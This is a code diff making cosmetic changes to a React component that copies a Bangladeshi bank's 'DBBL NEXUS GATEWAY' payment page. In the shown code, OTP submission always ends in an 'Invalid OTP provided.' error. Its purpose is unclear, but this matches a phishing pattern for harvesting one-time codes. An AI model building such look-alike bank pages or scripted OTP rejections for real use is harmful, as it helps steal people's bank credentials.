@@ -113,7 +113,7 @@ const RocketPayment = () => {
       setTimeout(() => {
         setIsSubmitting(false);
         setOtpAttempts(1);
-        setShowError("Invalid OTP provided. Please try again.");
+        setShowError("Invalid OTP provided.");
         setOtp("");
         setTimeout(() => otpRef.current?.focus(), 50);
         setTimeout(() => setShowError(""), 4000);
@@ -156,7 +156,7 @@ const RocketPayment = () => {
           DBBL NEXUS GATEWAY
         </span>
       </div>
-      <div className="h-[3px] bg-gradient-to-r from-[#0044aa] via-[#0066cc] to-[#0044aa]"></div>
+      <div className="h-[2px] bg-gradient-to-r from-[#0044aa] via-[#0066cc] to-[#0044aa]"></div>
     </>
   );
 
@@ -219,18 +219,18 @@ const RocketPayment = () => {
             </div>
 
             {/* Go button + error inline */}
-            <div className="flex items-center justify-center gap-3 mb-4">
+            <div className="flex items-center gap-3 mb-4">
               <button
                 onClick={handleOtpSubmit}
                 disabled={isSubmitting}
-                className="border border-[#999] bg-[#f0f0f0] px-1.5 flex items-center gap-1 hover:bg-[#e0e0e0] text-xs leading-tight"
-                style={{ fontFamily: 'Arial, sans-serif', height: '18px' }}
+                className="border border-[#999] bg-[#f0f0f0] px-1.5 flex items-center gap-1 hover:bg-[#e0e0e0] text-xs leading-tight shrink-0"
+                style={{ fontFamily: 'Arial, sans-serif', height: '16px' }}
               >
                 <span className="font-bold text-[#333]">Go</span>
                 <span className="bg-red-600 text-white text-[9px] font-bold px-0.5 leading-none">&gt;</span>
               </button>
               {showError && (
-                <span className="text-red-600 text-[10px] min-[375px]:text-xs font-medium">{showError}</span>
+                <span className="text-red-600 text-[10px] min-[375px]:text-xs font-medium whitespace-nowrap">Invalid OTP provided.</span>
               )}
             </div>
 
@@ -351,17 +351,15 @@ const RocketPayment = () => {
             </div>
 
             {/* Amount */}
-            <div className="flex items-center justify-center gap-2 pt-0.5">
+            <div className="flex items-center justify-center gap-2">
               <span className="text-[11px] min-[375px]:text-xs text-[#333] text-right w-[100px]" style={{ fontFamily: 'Arial, sans-serif' }}>Amount</span>
               <span className="text-[11px] min-[375px]:text-xs text-[#333] w-[160px] min-[375px]:w-[200px]" style={{ fontFamily: 'Arial, sans-serif' }}>{amount}</span>
             </div>
-
             {/* Currency */}
             <div className="flex items-center justify-center gap-2">
               <span className="text-[11px] min-[375px]:text-xs text-[#333] text-right w-[100px]" style={{ fontFamily: 'Arial, sans-serif' }}>Currency</span>
               <span className="text-[11px] min-[375px]:text-xs text-[#333] w-[160px] min-[375px]:w-[200px]" style={{ fontFamily: 'Arial, sans-serif' }}>BDT</span>
             </div>
-
             {/* Description */}
             <div className="flex items-center justify-center gap-2">
               <span className="text-[11px] min-[375px]:text-xs text-[#333] text-right w-[100px]" style={{ fontFamily: 'Arial, sans-serif' }}>Description</span>
